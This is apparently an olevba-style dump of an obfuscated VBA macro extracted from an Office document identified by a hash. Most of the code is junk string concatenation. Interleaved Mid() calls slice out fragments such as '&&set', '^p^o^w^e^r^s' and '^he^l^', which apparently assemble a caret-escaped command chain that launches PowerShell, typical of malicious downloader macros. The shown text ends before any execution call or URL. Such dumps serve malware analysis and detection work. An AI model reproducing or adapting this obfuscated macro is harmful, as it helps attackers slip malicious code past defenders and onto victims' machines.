Filename     : ./macros/dbf59825f4af6afb1640ded288844e5227108887a9dae54d01845f2a97959e1a
OLE stream   : Macros/VBA/KKNNfNZndQIW
VBA filename : KKNNfNZndQIW.bas
----------------------------------------
Attribute VB_Name = "KKNNfNZndQIW"
Function inTbXWIGiF()
jaHLizHndJl = ("GznUpEzFNiTdV" + "znwjjfNbCaSStZ" + "lzTKsvsPoQjWSO" + "ldrilXdKbidiwM" + "XLYLbkA" + "dEEXIPAJvN") + ("poaLoWH" + "sbORvDmtXzGmM" + "KOijAVubZhRr" + "NwAkoTzHsO" + "IUWWcLoatDdM" + "HWlsRCjzEfYz")
dbBUptGh = ("ZNqXAYtZfs" + "LzOtSzbw" + "OkublrMSDdQqm" + "OqNnLNQMG" + "sYRDkkjvK" + "GpTOlILaWBcU") + ("hzCEKQjYBi" + "jNaJhTtVjFK" + "XzCDBqqEnY" + "kDifZfbIELofYi" + "sDIGoTX" + "fFHMhiKarLO")
bDjpMHs = Mid("N561%wVzdFFABR8j7WYDu", 5, 3)
iiCFjN = ("NSTOdRArXf" + "YwNtrzTkkTcSiE" + "phnDozZEzVHfa" + "LpjqlUSp" + "IHLnMElAkJmcT" + "UrCwtPX") + ("StYYdtbwkYAu" + "wcKMAMVWVnj" + "lPzjVZZPYpSPo" + "rYnZObZZXOr" + "sCCNwFofsdcN" + "zaiFGJuXa")
MiOICXUr = ("qdVqjRNhu" + "imvISJG" + "qWorLpTwJ" + "sBBIaOF" + "jYafDqbJmz" + "tsTGISrbw") + ("jWlIMotEZ" + "jCtainLT" + "QBCUfQIZvtqjnG" + "DBpXrBhF" + "omqztYVHY" + "iPdCFrEPwKj")
YciiD = ("wiwZITLrkr" + "jXMLsNbJiOwa" + "PAuUQFzO" + "hFiAfjMjm" + "VfTDStOwTOrGA" + "lKHYraiu") + ("NpHhshuwCb" + "FfwzcaC" + "iAbaFWPV" + "noLNbKFNLM" + "OYSpiwDFOK" + "RXVPUlPBLdMWJO")
TOPUwU = Mid("w 0YqLpitESd0zbw1", 4, 4)
flIDihijpm = ("twkWjzncviw" + "ftZIfWXiLJYsa" + "kfmmjuiMsuOWrY" + "wizTnWMSvj" + "mAQkXswhNHp" + "wBLTBfuI") + ("zOPaZYmcXNr" + "IIdwHWV" + "KKMGYARcDLm" + "bvmmAJw" + "JEpuzHqtiW" + "JYiUpBICYGKZMb")
IRaVIQB = ("LnAVNCREnMs" + "wEJCicCroQvH" + "QnBSZvVrl" + "bDEQUkMIKl" + "XvwKCPPPs" + "stGwPPmNRWrLhh") + ("dLiHbHkVBtrCHW" + "FbsbjKwTFUa" + "tOWLOQLZDhIQnI" + "FDXMiqlQPS" + "wofscmB" + "qHihcmwzc")
NMwUpwaD = ("bMVqvzYCRFVSJ" + "KYtjRccsb" + "krHaMwfcSGjdYr" + "vlWQPUjzkOi" + "svwOilXGD" + "wpSZszCljACFV") + ("GcLdBsXLihmhU" + "zsBlWGnjwpbkz" + "hiOnZHHGZtFLSm" + "kmKfJnoz" + "iPEZdWBRv" + "iwTzINkrSH")
MDpcBNhAC = Mid("QRwpw4ERlvdsi2ta0qLhGHuXVDE0f", 25, 1)
GjWswXLIm = ("TcoantQhIv" + "IzHtJSX" + "LFWPZSQaVuaitJ" + "wqQXAmbviFKiJ" + "oTTYEQTwNO" + "XSvmhNKw") + ("LCsuWHk" + "sJPjHCjb" + "JptZzcCP" + "TjIzrzjDMma" + "BwjJEDwYPQ" + "LaDVFfLZq")
utfjH = ("sJqWvKdCEw" + "iBPwkqWORKj" + "cZbiMBfhw" + "IPhbYqZH" + "zYpzTwzUJJ" + "zJLsOzUf") + ("BZQhbszQJ" + "foJqhsnbH" + "PjVYoKwEoNb" + "trSaIHWbwj" + "rdTnSiAb" + "MzAUDrtQtv")
EuzzSDaZzwc = ("soEBvRPADqu" + "hIsMQuZ" + "qODRzWn" + "iYBMkuIIcHJ" + "iYMaULtvcsPQ" + "noikmEY") + ("lWfohPmzkkI" + "nURBdwldsBlI" + "LzFiXpDlHzCh" + "mvGwrIGfNTWd" + "qSvljkWE" + "SjVNvFzfWP")
EZDvjQPJ = Mid("KAvBAc5p3wTq18mLSAkzhPABt1TiD4Skw11RT", 23, 3)
iwWOjpqzRH = ("vqKvSYGjfFj" + "jUivUWjaolFJ" + "qwWQOFhCEPATYU" + "XQwPjRRzZwYtNV" + "KlABcZkTQzwff" + "dcvBlCX") + ("qccZwzUqMThPF" + "SXsUnzfQh" + "luwTdrcSQUvX" + "CbmwanfzPz" + "JYJQPZJZv" + "nEBANUqOzlUuw")
OsDXfvv = ("nqwnDmmlpMbLU" + "RVTOcRrCjWJcMO" + "hzIAAlAWmfuo" + "HhMRjmfXcj" + "EzkJaiaaYAIOS" + "ULQwhihc") + ("uzJrtZjNEO" + "vDBqwIFUQ" + "zSuGOaOYvA" + "ccpKQmhA" + "nDzCPQJZCYdNL" + "vhPlizUoJOGTaM")
UzzqZX = ("tAwFdBoWuiKEi" + "CrKVcjPX" + "wMToiQOsPZTW" + "aDwtBRJSq" + "liMHazRP" + "WPAsKNFFjpu") + ("PpnQHZjiwNS" + "EhJWIotz" + "tAzZKljv" + "cdvdWpZr" + "ZihbIztoc" + "jwswzUW")
izoaiMKtY = Mid("o59tj7FEvqdMIVBRzr&&seQ5pqoaKpfkjs1QFuz5u3S", 12, 11)
rbtiu = ("fWXTciwSrqwR" + "VXWwQiudBACBT" + "ulwwpztXBFujOw" + "XvjifTmrK" + "vRDiWVR" + "jCjvtITv") + ("VRBjQvOdEWTnjH" + "mttfptfkcbivhc" + "XOkURZI" + "fWoARwwUDu" + "IAOoFFphZElz" + "ADwEDLqUdWOJ")
slIsniIwwh = ("zbkumksHptVoj" + "dkKntiW" + "tPzGwlHjjia" + "icfooBjG" + "cplBZEHso" + "wTWhUujnH") + ("GNqNXaAFWzsvPH" + "ZOEXjAqsO" + "pHvKuIOcHNO" + "YiwECVoXDDPQvj" + "PazPVclhSFu" + "rdSHuDapZYc")
pjdvfi = ("sOldHbB" + "TBJaiPbsjRuWGz" + "AuQsERfdA" + "EMavvzKwmhB" + "dZvOcuETnusAl" + "qizdoXIvZCAw") + ("UkXUSMKQrwppk" + "jrKUaKLGbB" + "sijiztNf" + "kjPaZoaT" + "mHoEwbEPialcNI" + "KahdirDbJd")
fwqdHG = Mid("Bam65nJM%jprawj80miR1", 8, 2)
fCrkdDzq = ("UDqYmsiONjwCIz" + "WmzjwHtztkvVM" + "qCrwBuSlMv" + "ajOKfQzwKEC" + "sdqbFwoqWSu" + "dHDGDalaCF") + ("binOUvYBQn" + "wVKSNoYEDIl" + "jYMttkScZnEPw" + "iTuwQdjDI" + "vkMwCzBQpnGp" + "CfQzLBLQ")
DaqSt = ("nTujABNwnjNslQ" + "bsBQksA" + "QNQIIqTbp" + "ahLpBjhzUs" + "HQtajCHRSwEmB" + "VksEFTEYWLj") + ("mqUjnXIbIzWibo" + "KXZVuKKj" + "osPYmiuhrnQQwi" + "jiZVYOKd" + "GtBzqpjbK" + "uuIjpaDoqo")
kWwfF = ("WvGEKFrHHdPizJ" + "WabloZJMsM" + "SzjYBzSzNRqzm" + "YhfcadEVsbkZab" + "MjNsTmsbjb" + "LzvGfcopQ") + ("djSimzHEncXqd" + "icFTJjG" + "AHRHalvIllLiiz" + "JjplWvzuVTuYDW" + "fklhiKQfWV" + "fqmizSih")
lilXJOfruo = Mid("5aGLtEDKGcRvk%!      IRftL", 9, 13)
FEzBDXJE = ("wOoPpPkoHh" + "OzSshwrBDoG" + "nOXvjvVZTp" + "KfMhAZwnCrRjK" + "zsGwokjpq" + "ARUAsmH") + ("ZEHMUOrc" + "ADfWiNd" + "COdiFJUpMjjE" + "uQkHHGJkYrFMfi" + "KiSEqOqXifUu" + "XIhHXGGnvPbG")
zvFiTtHA = ("RdlvwqmPZN" + "BOzZrwh" + "ZqabkzIdIoQi" + "sVmnuCaGGT" + "OLABBILGQP" + "iqCBwnNdaIi") + ("JsMmwwGaTXEM" + "wGbAdJSFMn" + "ltDmsdsNkiqJpW" + "KKoNLlpcB" + "mczzMbzFQACs" + "ipirctGzm")
jGjVVfJFB = ("BiWXSZbiih" + "fOjEsFcmL" + "NQJwpYczOO" + "zXMLAGMuTEsaT" + "JXCuqnovwnO" + "ZdAwjPTXi") + ("XsrwPsrSVpqVf" + "aEYbCBa" + "znhjuUVcHv" + "SAJDrXwDiSYWDz" + "YiqsVjQwvDRjzW" + "sivcNBQBhDFzwG")
FwqGolNNm = Mid("mqZLQHuww=lKmlI8D0pFOBld", 10, 6)
MZHUo = ("OwHRwbKvRCF" + "BvOXDtD" + "VLSqFXhuMi" + "kAziAEJwiGFlqN" + "oidEqMtNJCj" + "LbtQiiGVG") + ("NNTtvZS" + "accdjzQIs" + "rmnfUowWlqWD" + "sVkVPlwQTvtc" + "nisuzap" + "dTQhtivYoc")
oaTVmZ = ("SujpKozEDVnh" + "iAaBFOlZATTkXU" + "VwUMKwS" + "smwCszVsipDpD" + "anGkGSaNFmTwjE" + "bXzPHiP") + ("MsZialvU" + "wZYjFarzSih" + "ivQRrHRG" + "vNKjurhozbJ" + "owJjUVzFP" + "DhudzJNjidNEC")
ECtZLC = ("XskHwdAWwSXru" + "PAQiqqw" + "LOBUoWGBr" + "TAELDatQwDt" + "GcVddif" + "zlzJhVGipiPuar") + ("tzEwplassT" + "IZwKscW" + "ihDuiiUOaTowiP" + "ciZhpIX" + "FqaNjjflnYcJq" + "EZOVXzYDVcsUW")
CpkkHLwMtGS = Mid("qGdZ6ShJVhCwWJF2YqTudSB", 7, 8)
JztovqEw = ("OALiKLSD" + "tuzGkXlUBK" + "JcmQuXbQ" + "jEjwwSUKOuEVAK" + "izCcMsJ" + "uvDlOuon") + ("BFroKAJSCbFG" + "lJSliuU" + "EEWspBtjGPaHUT" + "SMYwsJJRDFnJtS" + "MtSlzAUwVzQ" + "wLiwlRPAZJvb")
zDbMbmQUH = ("oNkkXUJ" + "YzGQjrquTGiwN" + "hIHYkSa" + "USpmzEwP" + "tVnjjwrVLzh" + "dodnljcdwkrRSc") + ("atulwEbkaZWzJ" + "DYUsJrdMw" + "YWlfJiWN" + "KRbQMlsB" + "DOOiSOv" + "WYIlKNvj")
vwbpd = ("vnTmBrAOdDhoj" + "uzPDzcYNFZ" + "CsdSDCwr" + "BMBJTHPXSIzKCu" + "CJGwwQiitf" + "zWvZAjznUhvGjr") + ("BuwbwzzI" + "uvBsfTdId" + "ItbsHOMOZn" + "CWEmPnm" + "iACOffEhE" + "BDncQjTZ")
aYWzM = Mid("Jrp8wTmmiR EbpivwIFFcmzKEAHcSGTDWA%=o^we^r^s&X7lII", 32, 14)
JnXpKPObqE = ("ZSwavDJrz" + "cIIHRpZJjwpEXk" + "HzFVAEfhzLaFdH" + "FrSQSDOR" + "vkELmXVvLcoFD" + "wtzaIvrkwB") + ("qwlGRvtjNZ" + "zTucqftBT" + "BVTXVcG" + "AKoCnwZjou" + "uZpwjudfjEMr" + "iSocRjvSnJNObw")
qzwCzbsnjLa = ("IBGcKGwnF" + "bLIwOwfsNY" + "SCQcfUOTcttm" + "wJDzODlustlZ" + "jJnGklWfpz" + "ziliUddiZWCFv") + ("iKmraIfDGkEf" + "JHQGGKMzjR" + "aPPCzCh" + "sYGbjnP" + "KwYBdoGUbIPvu" + "jusjRKtdDDDA")
sFqOOwlh = ("wCGqwUYjLZk" + "swZRnTsUUHw" + "EwNHPciHz" + "hdzVsaKmdDjGDV" + "rZvicMrGo" + "AGQRjrdfvPwT") + ("aSJiitlwu" + "uXCmYUkpXJjsU" + "VtMDaIGRYHUQS" + "NMCmFOWthEE" + "KaYKihwQ" + "khiYmlczu")
GzzDjnJDlij = Mid("AHX   pYjcIopGpALjkzDlR b0mAwDuwiYRLpEG", 4, 3)
bwiBINMFlnF = ("zDfhSqTCBLQZm" + "vbrnlJJo" + "jzWFzhtU" + "dAIRvbwFbjijbJ" + "BzBMQSqiJrw" + "wlWUHqTwlAdf") + ("qjidFbHpr" + "zfhEfmW" + "ZztATFLasIMtBT" + "wZlIADQosF" + "WpamnKOAEjWp" + "cRfjzczB")
RHEhNlwGoJ = ("XXDiKafJVJHZ" + "CtkmIukX" + "zGWzqrioVobQH" + "JOnwmXK" + "rKYLJkhZkz" + "jZzLKkni") + ("oSzrvsaXUwzA" + "ZOLaiitGwEb" + "XbMDdOw" + "ckZNhQRJJEoCL" + "AizjGFl" + "rNWmXROUrhz")
CsYXOwDYn = ("KlitdVvJLBv" + "iWzFUCfAPpZj" + "fjYhoPHjqf" + "IuhsFuVVuauvf" + "faSAQULuTzm" + "cWlnFsrKwZ") + ("mvVUDpzlns" + "JopfaKd" + "akGhSwjGU" + "EVjFGfE" + "AHETLziYNzzZRj" + "iwjjODVTifk")
vMEEwljYaTa = Mid("rrt %mIUsNwNqZBoUjPash0kQHhwY3zOF20wmOrd4qDw1Q", 3, 7)
idVfuLtRQvS = ("BppwtORj" + "rQZtSbiDuItHBs" + "qvszvpNG" + "DDKsBqr" + "BdAwztEpjRzZG" + "AwdHzVR") + ("IdKWqPQlCDQFF" + "sPtBnKMXQj" + "CCOPtsVWMVWmaD" + "ZzPtIBvdEOOwh" + "ckNdanMC" + "ILuisBVcTw")
bJYppnhQMBM = ("JDaAcNiZpz" + "vbRAOKnfJqmW" + "LjuhYnrPvEAj" + "zfWNKIlcKoo" + "zmuYwhXhrosTwB" + "HUzWQRj") + ("IIvfdkFBu" + "iaAzqwW" + "CmImDQJGiIL" + "XiNZmPBBu" + "lnwNOaBKiAAnPz" + "VFiWWGz")
BIABfvjnonA = ("kOIWXuGZJAiwoP" + "lIIzPcXaGiOS" + "bjlvzjW" + "brGfjnsWd" + "GTIQMUTjW" + "oCnJcEwaO") + ("wEsXJRCTioiE" + "UHzuKWRbOMI" + "ZDwDcoSHuP" + "akGvRzA" + "jjZTBcKnEzHk" + "jwkNFPGALwhEG")
ivaQcCJXwiQ = Mid("D3EqjLWmwwpw1hmhJZZstPGW&&!%siROznNORrt1Zuk8r", 24, 8)
vBAiiFz = ("chANbKazUiFBV" + "pCjEUiKRkTQVR" + "WfXqnzVf" + "NaADDjEJv" + "hQcmRmTfLzjw" + "tRboKPN") + ("SKnWiTaHkf" + "UmjttsFD" + "RJhhQUGmbr" + "uiKPGpQnSsYaSX" + "TJXivELtGIc" + "FKMofsl")
whrON = ("ZVjijSsEVjzhdd" + "HAUJhTQGfpQ" + "oMuJXGkwwIKJw" + "UhMfXbz" + "EdGwEbJOAsS" + "DrbXZbtfiwp") + ("MdwiuASp" + "NIQDYBIpkHRqWA" + "GoFwiSvFoum" + "dbUAadjqjLT" + "ZlqurXU" + "cVbFuVHbRDcJm")
LhEOXon = ("lcTnEcSkb" + "iPKoAwOtwpipD" + "djKdFDsi" + "IqqqjdTmbROZ" + "vRJPamwv" + "wZMJURoiXzA") + ("BzJGfPdCHYph" + "otUpdGllc" + "RdZJBzwtOYitTz" + "uWTtYYkf" + "fYUottPwZDsdF" + "bELiaIm")
cksWAmZMvVX = Mid("BuwG9pwBJzet %ABtGcRvk%=Uwj", 11, 14)
zpvVAj = ("fNPHqMqKtu" + "EXwcBOQZwz" + "zOGFWEYj" + "KOzGcijjIARb" + "kpwKzQpLjqaX" + "BAlqlmNLL") + ("XpzWijRwifSiQ" + "MFIqXbXZ" + "OdjvSOiOVZwb" + "ztLcRursvW" + "fifiWokSzGlt" + "ozhDQzFSfqGOfv")
FVPzXmCAX = ("dEzmOijCi" + "AYLmHJNqVJjzaX" + "qdwjqhnZqjk" + "ODHujvFiujMrG" + "SbRijdbKXEkSo" + "MwUDWVznN") + ("DCUtjGRGc" + "OMIHDHMDfDKNHq" + "wOIUlsfNC" + "iIidRmippAz" + "MAPIvHKEpvdbk" + "ImrFizFcZwiZO")
KDswzzDRbpE = ("diqTGzQo" + "ArjpjiONAPoS" + "obzRRznZP" + "sapOPSmvXLwDZ" + "QlAcsNPGq" + "uPVphQAKk") + ("oOrPzvN" + "QGPkCjBjzL" + "CamkYUAwzOH" + "nSYcBulc" + "zvqkAJNonARpdi" + "BiSuwzQFJwb")
REXpmsFJ = Mid("FdjB1WOAfm5omoRq4vYNVG4wDFLsf", 6, 5)
GaSbZlCBrLQ = ("fXRqSFCIE" + "zYCzpiiHsZd" + "wkSAkkaQdVtuZ" + "dnIfpAhNI" + "wImqUXjo" + "nZhXSVRhozbi") + ("YYFqwNkd" + "kbIDbzkw" + "oFHlswQq" + "XStOjfok" + "ldYTEJdoF" + "OuUwrsnZA")
HfNIJin = ("XzFDhzTQRR" + "jScSfzsqIakc" + "hrQYMdqKiSM" + "wZITTZIWJ" + "ahSCkjArvnUbV" + "hvEnbYBzPEjXk") + ("oAbGVpQiFJ" + "JJqXZuXDRmYVU" + "lrbSOVMwdDvLNG" + "ZwpuuROKcpK" + "USkPfHLj" + "pPqohNfnbOjRXs")
cjdqOQlfrP = ("fIaIEMLRWucPr" + "zShVAwHErAbP" + "VBVtGnz" + "dDQOswLRKmzC" + "zYLRYCfbQZjp" + "pPABVctA") + ("PRGIAwmjNc" + "SYcKbhkS" + "MdjZjIvQ" + "QWJkaJtK" + "CiokLEcqR" + "qZorbtKlhhZrA")
QnRqzW = Mid("zwFrq1aWDiAtzdDw0kLL4uVrXSmHGRiChXHiitmCcrMD", 30, 6)
nNlGn = ("jbadWjwcEMris" + "QEBWikjzFNEjX" + "bdszazj" + "jiMRqnl" + "pjmzLKiupHE" + "VNYnJwBbTuDv") + ("MXTJQuvN" + "XUwXoRzzISs" + "iSJZIslKIufrsz" + "LkYNIVrpDrmJ" + "bWmkCKdEJkIC" + "DVdpFipi")
IuhTwcMTic = ("uhkPijniVqc" + "ZzAFYPuAZkQ" + "mBBjCowShB" + "zFIlMALkwz" + "HboUqCZMFKRPc" + "hDcjtJzXXCzP") + ("izOzTUttavh" + "utUvPjpfEiwiDC" + "vjEmUaYrMrKzv" + "nHIujzQcbHWK" + "ZDDfwQizJWIN" + "VCHEFiuwQX")
EJLzTzz = ("NjFkardGiViBi" + "HuoiWhBzQLwS" + "MOlHTGnJDf" + "jlbDCmTIU" + "VuRwTwmNTulI" + "RrwOOvvcEP") + ("zkGwwdrpzn" + "TULAJAvkkjaQK" + "GYENZGRf" + "wjqnQpDwLiaYbC" + "lujUfpYTv" + "qFmbYjYoZORTN")
HmIUOINY = Mid("G6jMprOpn9Suw^he^l^Qvjkh0D8rDjn", 14, 6)
pKkFAdmvV = ("nUDZTIwQJrwnJ" + "OjQlikzh" + "dOVWCnPn" + "jOrcNEiB" + "sDfWOztqBdK" + "moGHZLwltcuE") + ("GuUmSLHcKGdhG" + "XdMlmcWuakUotj" + "jQJbhICYE" + "RDJbhcaSLaHh" + "IcSMUjRiSbMiq" + "GZrUFIDUYM")
USXJsDRRT = ("zJsjAdinjvmO" + "VSwPkhjsbl" + "LZlLAOrkMEXv" + "cMSFrkZJfSwN" + "YjjJrVYHXasW" + "VECCOzWMmXPdA") + ("LbjGozQqKACNB" + "cEmajDPVGc" + "zqWlJUf" + "fMjrTDYWitBzB" + "AjilouzbqUDCpH" + "FBjXWWJwNSWLjk")
BdZsBdf = ("sIuWhFIwZ" + "wOwipmE" + "czwqHUsUGCZnnD" + "tbbXIkV" + "jRTHLum" + "WwUvPWBAa") + ("NwGZlNuIDGO" + "wPGuQYoMh" + "TmDpTIqXZa" + "iWWwHjFMDrjCHC" + "oVFcLNw" + "iUVvumRfjnQRs")
blZViDZn = Mid("2cdAEwrfnDU9crdpwbnGREfpX1IcADFr5", 10, 2)
ZBzzdLwFQC = ("FcCEqnDXflt" + "WLnQORc" + "sVcfYqmUSS" + "QqOObAlQGBdA" + "cSmlZBHuELjk" + "XfAAiFNCcNIwMQ") + ("AVXOVqCFDBu" + "KpMffibcF" + "GTYmkzFio" + "litinUPJU" + "wwnpCMQhcR" + "oXkPEqiGCAYM")
DqCXiCAwdw = ("mjifbWIz" + "bNZmRAEspWs" + "fbYoVwGPGhwVl" + "voWVdwbCtMl" + "ipWKXDL" + "GFGrGXBjVt") + ("DAmEQVTtw" + "diLDTQRtv" + "vKRYqifP" + "urjzwhB" + "kGoDKOFcWunmGk" + "ZjStjNNiqDnCX")
szzYvVjlWiu = ("fjvdsKPRHfTH" + "ikXjXBWczGI" + "iihCSZXmFK" + "QnpSCTjrRH" + "HzjTcXpFhZ" + "KJjiPpGvVZYOG") + ("ijTIQPqLJWjTwz" + "wAcwdcf" + "UEqlWmwijdXu" + "VwRKwwzJwwrJu" + "ZwRcTCzzEa" + "UZLnzpbCNaD")
UAuzRH = Mid("JOtJ0KYlvHNSKzRJ%YEDm0E", 6, 12)
ZlvzIM = ("iNVSUjmGFlvLwT" + "rdzJBGQfoRhWY" + "AWMhiojSTlDDSd" + "zXRtuwaosWrR" + "jAnKOIFOjiRf" + "YJNFwnmw") + ("uPcdzZiTLnWwl" + "wtoKXSOtA" + "naQbmXEfj" + "GXhkIjjPTdIIn" + "OMJcOfcBPNqZI" + "hnjrPvMb")
fFMDRshBu = ("KuNiTnXDbvY" + "SHPKSzRsb" + "jDjQRiRttNt" + "adulvDRXsBb" + "swlDbsMOCiO" + "vCWsmhBL") + ("qhmPhDOaEn" + "cEXUtNSBAiY" + "OkptjZkKzQHCPw" + "towowrjhqfCzZ" + "AKsRlXirK" + "BUcfLwVEuYYM")
MIIFCkq = ("EBrlwZXG" + "mZNaObQDNFH" + "ujXaijuQsr" + "mBEbXuibsHK" + "jtGYIbLiGUrK" + "ULPtcpmuv") + ("ZJztJiiPMjw" + "jbHmpjJXSJuJD" + "PhPRYsnShOIi" + "zcEibVf" + "nmqAGkXIPPq" + "aTwAvKEANtsdH")
qjYpalvd = Mid("Ec2Lql&&set %V51HtT7tsP2w7FQa0Aw44wc", 6, 9)
wXwiBGwkpJ = ("qaDfCwN" + "ZLvzFPkdbJC" + "RmiODWuKzEA" + "nICrirbswCbIj" + "GhkaTOWilDv" + "bjEDhVKFLzMsv") + ("iJjOLVhXQMZW" + "lUFXwvsQvotV" + "wbUIUsfj" + "MBWsaHDPriKj" + "kGZNwCTmVn" + "EXGDHsjrCEHDBG")
pAfIiNImXkY = ("KkjXawAOm" + "LUcsjvzqC" + "tzAcBbD" + "STGTdwFNQO" + "InhImoqi" + "vRGAizWKkH") + ("wtawTIrrfn" + "iijuQMqNnL" + "jiAMFpfZucJtM" + "MloiwwCjZ" + "YUjhKUWTKFKw" + "HCCMGttVoUfEbC")
STzOwhJuTiH = ("lMfwOKXYqO" + "GvcPurNcnCBA" + "zzTjUdCY" + "aRHGYYjh" + "PoYmlPnKQpYSTk" + "XzRrqENM") + ("zULInSot" + "DmLkNMDt" + "MMzoHjvj" + "HrqtBcMmQDi" + "zBfMPzAmkE" + "wuBzLKMiMDrhB")
aOquXVZXL = Mid("pYRzYSDzDm78d7fGEiCAnjEkUaD%=nBAvOof1AI", 18, 14)
TiPbF = ("qMqCENolFwPa" + "qjHFPoj" + "umwmfRjAEci" + "nczOHsiTR" + "OqTnfFNaomVHwa" + "PYwEkBVjISNlsz") + ("GNKwYGTsmd" + "dnwvfjWVrTlOj" + "sJLVRUUcRfIzwC" + "wjJazXhkMnhOX" + "DUwiDfw" + "WVJSBVRn")
aBjhD = ("auYOzpBacdTfzW" + "VIYhfBKwaXL" + "PUizmquhzWOnj" + "jiitdjND" + "kkSnwPwzroBl" + "tdhpEocz") + ("lASSfQhtiaLmwP" + "CwRCYWwibd" + "ELobYbhrwRUi" + "jPwKbZUvONmG" + "ZbWnVqpvLV" + "CBkEGQC")
fLJnHQvj = ("hUhuncniXKZw" + "jFzWOKJTuWqo" + "oRfWMSZF" + "upKQsLv" + "UXKomEUiHGi" + "mzrGdnWDA") + ("GYdjKIMzSwXPCT" + "UCMKsEMvqNw" + "EmFosfWQlLDtMS" + "ojqXvXbJ" + "JsIuudmWOKHL" + "JfkfDsJzT")
rJYLqwQWj = Mid("T9RcmfLh85h0RdpMEwTd&&settrupAE5Y9wvLunO", 13, 13)
NnVpPamCRD = ("ThWIYoDCIoqw" + "UBCGULw" + "ooVuuHapPpz" + "EmpDSwwS" + "jGVXBhAiwmFGE" + "tBOihdNtztm") + ("iMwnWMdpIizWsZ" + "GQCrFAHwCE" + "RpbmGblDzn" + "KPscOWKBrlHD" + "dwBjzaQ" + "jCvnNWcYloZlXF")
jZrQZtH = ("SiESCLNCGk" + "hMPOQjDCsZi" + "akYmuWj" + "nozbkjaNLZOain" + "wnsnjrCA" + "kjiiiYSfXqssMn") + ("jFqqTLITmbb" + "CiCCkoBrEFsjnG" + "CrvQkAOHbBLj" + "bMrHCaQzUoHE" + "vZaNHDNc" + "crLrwna")
chlnf = ("zdlllANiJmVJJ" + "EFZXmbNzoBA" + "dFzhRiXJCDMo" + "vWUlBrMTzjj" + "OkiZBoj" + "EXHlcVmmzXBt") + ("trEsMnJnOfZN" + "CwsjAOcDaYPj" + "jFaTZfqP" + "tZhpBawpsi" + "uSotPXmQjT" + "pJCGENvFt")
YvRzYOF = Mid("K5W9ipjltvGizFLowJkoEELb7jtzz7STzw6oEOAqwGSA1msdB0wA", 11, 13)
IANlzYCrY = ("BZHOPrNkjMq" + "hDnLZEojNtHT" + "WkzwLccW" + "mizwjiMcbqWrX" + "EzStwuNIRn" + "tHOoUkN") + ("oQEOcYGTl" + "QwSwKvwti" + "cfiRJsnawnG" + "JdjIzkp" + "sacpAqluwS" + "bCklImnFklfUz")
AJCUmAQ = ("uluYsAOY" + "vHCXOGo" + "DwLJtJQpkp" + "fWwWPbRtz" + "zZtzSaLhikSwN" + "UwBAbdjHLBsiz") + ("mwzMpjDZRMbj" + "ICEvjIG" + "SZQRVFs" + "sFkcZumnG" + "iovfpZsY" + "FGGLZqkUWju")
EEzGWTnrLz = ("KnoPCvMD" + "lCDoQSGsi" + "wfEZsaVMiFj" + "FfdpDwftW" + "XowiFzWndsB" + "AjGOwojihwiXw") + ("LbOJMkJRIP" + "KVYqrbrLRiz" + "pArNozYJblhm" + "YTfRfjYqolTIsp" + "mMftNsZIVX" + "TjFzYnmuTH")
OQXroWcrXn = Mid("MDi8s3l51V%dj", 11, 1)
WOvIzODMai = ("iKMYHrHfNP" + "oXiSFnkqZ" + "dnGmtKmpZPGMpz" + "jGhiktNppRo" + "YihmpUXBXFmNjU" + "ozLchipWjCIoD") + ("zRVFPOLsd" + "rRwGdUTCQ" + "ZpioGPi" + "AkhfUlZo" + "IQGivWulP" + "jsLiFYzqInj")
ZQlncGwjW = ("LIISwcQHPBNLi" + "GDJSzZdQiwS" + "wOmDkYffA" + "GPmKZEoTYwtbL" + "YwLWNvdM" + "hfCULQojwaPwuf") + ("AYcLXUVVCdfnN" + "SFMtPFfW" + "cCjRuBvMiQWV" + "TSpfMKzqjdbXf" + "DDiaJipzIn" + "aTGRAWq")
VCzqXGuHfCK = ("zfDrsiMzNjpDLl" + "ZdTjDqjz" + "oBbGVvRBk" + "QbbEdMYS" + "CDIWUPaMo" + "dIQfnCr") + ("GcRPnSDU" + "zZpXiXQzLjfH" + "ujczGzAvnBmFS" + "BmPpTzhcmzjzk" + "ibWMwPhinqMDUl" + "YCSMhPKw")
UUbMU = Mid("448=hwBmmSwjca10dkpup1AP9", 4, 8)
PrGUMhHHGEC = ("iltEjsUWswZIu" + "jsIzpNrzT" + "BdlrsZfG" + "jBjJwuioHwDj" + "HLnOIBjdvfS" + "DGGdiTQSXKNw") + ("JEHYkDQZVVZD" + "QiaHoWRZvob" + "dcmQIzwq" + "wwYELbBKhlj" + "zDmsPWqfJO" + "jNHaiJMXb")
IpsfNFSpjHz = ("MAfBaJYh" + "WLZjPwv" + "wdvFLDzlDSkrk" + "EqkfYWNcZQ" + "WpwzMOzOX" + "JNHAwfPWqn") + ("VwHjzjZYaWDio" + "OCorEmdMzuccf" + "qzGjdbBspNM" + "YqzDGiSLida" + "lAMJwMGWEzh" + "PUBNnVMafZN")
YWQZOkoOi = ("wRhBCcuPO" + "DuldZzYsa" + "KWkjsrEB" + "BVNFMBlFrN" + "wQuANlcdAikUzT" + "bjAILYs") + ("NspoYcnujfhLu" + "kTGPaAtQAQm" + "ZFFiCUDY" + "HXzDBMkDoPHI" + "vjBwwswwrZBPCi" + "wdMIWvdwJLYnI")
osAWqODjkd = Mid("VpfLwv7mIUsWOAfmDWAunLhdLqSE91r6", 8, 12)
AcprwZZYv = ("PwotKTtNXbzcP" + "wdHpabIUolhFY" + "QzzMmZuAY" + "MkDUFoWY" + "wZjTpzmiuHCMFv" + "zXblpqzvEvd") + ("YoPzOIGcojjKM" + "uzsVAGo" + "XhMljHwdfY" + "IOpfInDw" + "rQrQYpvwCi" + "WBARhndZzdKBHz")
FCFZmBHplZ = ("RBUYauYQ" + "IwEVAGWBzr" + "QAIKjQkjpEbEvT" + "wQzEXoVHNzNhi" + "AROUQqRtKpJKra" + "hsJCIKGEu") + ("HusvKVjCl" + "mMjfdaDGIvNwu" + "fHEfZluNUBJwY" + "zTaHGldUIiYiGz" + "zFKzBPDQDcAvZs" + "VhBFGoVFqJNK")
wmjHwR = ("mETkhwI" + "jGqvMtMAbw" + "oHNYwUKdzpj" + "jRUCqiRAz" + "jTKqrQfmd" + "FiKwYjVPXTIf") + ("rHirrWVJvfZatN" + "duzMMwJF" + "YdKJCdiF" + "TSjMYoQ" + "aJwkWiSN" + "dWvSDiCXTNMM")
sjXpmw = Mid("AYJ8XohAAWCf&&sGkii7P6fmAwoKilz6a1N", 6, 10)
